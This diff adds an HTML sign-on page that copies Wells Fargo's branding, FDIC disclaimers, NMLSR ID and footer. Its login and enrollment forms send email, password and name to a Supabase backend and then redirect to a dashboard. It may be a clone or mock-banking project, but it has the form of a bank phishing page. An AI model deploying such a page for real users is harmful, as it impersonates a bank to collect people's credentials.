@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wells Fargo - Authentication</title>
+  <link rel="stylesheet" href="css/auth.css">
+
+  <!-- Supabase JS SDK via CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script src="js/supabase-init.js"></script>
+  <script src="js/auth.js"></script>
+</head>
+<body>
+
+  <!-- Header -->
+  <header class="wf-header">
+    <a href="index.html" class="wf-logo">WELLS FARGO</a>
+    
+    <button class="wf-mobile-menu" aria-label="Menu">
+      <svg viewBox="0 0 24 24">
+        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+      </svg>
+    </button>
+
+    <div class="wf-header-right">
+      <div class="wf-header-links">
+        <a href="auth.html?mode=signup">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+          Enroll
+        </a>
+        <a href="#">Customer Service</a>
+        <a href="#">ATMs/Locations</a>
+        <a href="#">Español</a>
+      </div>
+      <div class="wf-search-box">
+        <input type="text" placeholder="Search" aria-label="Search">
+        <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+      </div>
+    </div>
+  </header>
+
+  <!-- Hero / Login Section -->
+  <section class="wf-hero">
+    <div class="wf-login-container" id="auth-container">
+      <!-- ========== LOGIN FORM ========== -->
+      <div id="login-form">
+        <h1 class="wf-login-title" id="greeting">Good morning</h1>
+        
+        <form id="signin-form" onsubmit="return handleSignIn(event)">
+          
+          <div class="wf-form-group">
+            <input type="email" id="login-email" class="wf-input" placeholder="Email" aria-label="Email" required>
+          </div>
+
+          <div class="wf-form-group">
+            <input type="password" id="login-password" class="wf-input" placeholder="Password" aria-label="Password" required>
+            <button type="button" class="wf-input-icon wf-show-text" aria-label="Show password">Show</button>
+          </div>
+
+          <div class="wf-checkbox-group">
+            <input type="checkbox" id="save-username">
+            <div class="wf-checkbox-text">
+              <label for="save-username">Save username</label>
+              <p>To help keep your account secure, save your username only on devices that aren't used by other people.</p>
+            </div>
+          </div>
+
+          <div id="login-error" class="wf-error-message" style="display:none;"></div>
+
+          <button type="submit" class="wf-btn-primary wf-btn-active" id="signin-btn">Sign On</button>
+          
+          <div class="wf-divider">or</div>
+          
+          <p class="wf-signup-prompt">
+            Don't have an account? 
+            <a href="#" onclick="showSignup(); return false;" class="wf-signup-link">Enroll now</a>
+          </p>
+
+          <a href="#" class="wf-forgot-link">
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+              <path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6a.996.996 0 1 0-1.41 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/>
+            </svg>
+            Forgot username or password?
+          </a>
+        </form>
+      </div>
+
+      <!-- ========== SIGNUP FORM ========== -->
+      <div id="signup-form" style="display:none;">
+        <h1 class="wf-login-title">Create an account</h1>
+        
+        <form id="signup-form-element" onsubmit="return handleSignUp(event)">
+          
+          <div class="wf-form-group">
+            <input type="text" id="signup-name" class="wf-input" placeholder="Full Name" aria-label="Full Name" required>
+          </div>
+
+          <div class="wf-form-group">
+            <input type="email" id="signup-email" class="wf-input" placeholder="Email" aria-label="Email" required>
+          </div>
+
+          <div class="wf-form-group">
+            <input type="password" id="signup-password" class="wf-input" placeholder="Password (min. 6 characters)" aria-label="Password" required minlength="6">
+          </div>
+
+          <div id="signup-error" class="wf-error-message" style="display:none;"></div>
+          <div id="signup-success" class="wf-success-message" style="display:none;"></div>
+
+          <button type="submit" class="wf-btn-primary wf-btn-active" id="signup-btn">Create Account</button>
+          
+          <div class="wf-divider">or</div>
+          
+          <p class="wf-signup-prompt">
+            Already have an account? 
+            <a href="#" onclick="showLogin(); return false;" class="wf-signup-link">Sign in</a>
+          </p>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer Info -->
+  <section class="wf-footer-content">
+    <div class="wf-disclaimer">
+      <h3>Investment and Insurance Products are:</h3>
+      <ul>
+        <li>Not Insured by the FDIC or Any Federal Government Agency</li>
+        <li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
+        <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
+      </ul>
+    </div>
+    <p class="wf-deposit-text">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</p>
+  </section>
+
+  <!-- Global Footer -->
+  <footer class="wf-global-footer">
+    <div class="wf-footer-inner">
+      <div class="wf-footer-links">
+        <a href="#">About Wells Fargo</a> <span>|</span>
+        <a href="#">Online Access Agreement</a> <span>|</span>
+        <a href="#">Privacy, Cookies, Security & Legal</a> <span>|</span>
+        <a href="#">Do not sell or share my personal information</a> <span>|</span>
+        <a href="#">Notice of Data Collection</a> <span>|</span>
+        <a href="#">Report Email Fraud</a> <span>|</span>
+        <a href="#">Security Center</a> <span>|</span>
+        <a href="#">Sitemap</a> <span>|</span>
+        <a href="#">Give Us Feedback</a>
+      </div>
+      <p class="wf-copyright">&copy; 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801</p>
+    </div>
+  </footer>
+
+  <style>
+    /* Auth page extras */
+    .wf-btn-active {
+      background-color: #D71E28 !important;
+      color: white !important;
+      cursor: pointer !important;
+    }
+    .wf-btn-active:hover {
+      background-color: #b01820 !important;
+    }
+    .wf-btn-active:disabled {
+      background-color: #e0e0e0 !important;
+      color: #999 !important;
+      cursor: not-allowed !important;
+    }
+    .wf-error-message {
+      background-color: #fff0f0;
+      border: 1px solid #e74c3c;
+      color: #c0392b;
+      padding: 10px 15px;
+      border-radius: 6px;
+      font-size: 14px;
+      margin-bottom: 15px;
+      text-align: left;
+    }
+    .wf-success-message {
+      background-color: #f0fff4;
+      border: 1px solid #27ae60;
+      color: #1e8449;
+      padding: 10px 15px;
+      border-radius: 6px;
+      font-size: 14px;
+      margin-bottom: 15px;
+      text-align: left;
+    }
+    .wf-signup-prompt {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    .wf-signup-link {
+      color: var(--wf-link);
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .wf-signup-link:hover {
+      text-decoration: underline;
+    }
+  </style>
+
+  <script>
+    // Greeting based on time of day
+    (function() {
+      var theTime = (new Date()).getHours();
+      var greeting;
+      if (theTime >= 3 && theTime <= 11) greeting = 'Good morning';
+      else if (theTime >= 12 && theTime <= 17) greeting = 'Good afternoon';
+      else greeting = 'Good evening';
+      document.getElementById('greeting').innerText = greeting;
+    })();
+
+    // Check URL params for mode
+    (function() {
+      var params = new URLSearchParams(window.location.search);
+      if (params.get('mode') === 'signup') {
+        showSignup();
+      }
+    })();
+
+    function showSignup() {
+      document.getElementById('login-form').style.display = 'none';
+      document.getElementById('signup-form').style.display = 'block';
+    }
+
+    function showLogin() {
+      document.getElementById('login-form').style.display = 'block';
+      document.getElementById('signup-form').style.display = 'none';
+    }
+
+    // ==================== SIGN IN ====================
+    async function handleSignIn(event) {
+      event.preventDefault();
+      var email = document.getElementById('login-email').value.trim();
+      var password = document.getElementById('login-password').value;
+      var btn = document.getElementById('signin-btn');
+      var errorEl = document.getElementById('login-error');
+
+      errorEl.style.display = 'none';
+      btn.disabled = true;
+      btn.innerText = 'Signing in...';
+
+      try {
+        await signIn(email, password);
+        window.location.href = 'dashboard.html';
+      } catch (err) {
+        errorEl.innerText = err.message;
+        errorEl.style.display = 'block';
+        btn.disabled = false;
+        btn.innerText = 'Sign On';
+      }
+    }
+
+    // ==================== SIGN UP ====================
+    async function handleSignUp(event) {
+      event.preventDefault();
+      var name = document.getElementById('signup-name').value.trim();
+      var email = document.getElementById('signup-email').value.trim();
+      var password = document.getElementById('signup-password').value;
+      var btn = document.getElementById('signup-btn');
+      var errorEl = document.getElementById('signup-error');
+      var successEl = document.getElementById('signup-success');
+
+      errorEl.style.display = 'none';
+      successEl.style.display = 'none';
+      btn.disabled = true;
+      btn.innerText = 'Creating account...';
+
+      try {
+        await signUp(email, password, name);
+        successEl.innerText = 'Account created! Check your email for a confirmation link (or try signing in).';
+        successEl.style.display = 'block';
+        btn.innerText = 'Account Created ✓';
+        
+        // Try signing in directly (if email confirmation is disabled)
+        try {
+          await signIn(email, password);
+          window.location.href = 'dashboard.html';
+        } catch (e) {
+          // Email confirmation required - show message
+          btn.disabled = false;
+        }
+      } catch (err) {
+        errorEl.innerText = err.message;
+        errorEl.style.display = 'block';
+        btn.disabled = false;
+        btn.innerText = 'Create Account';
+      }
+    }
+  </script>
+
+</body>
+</html>
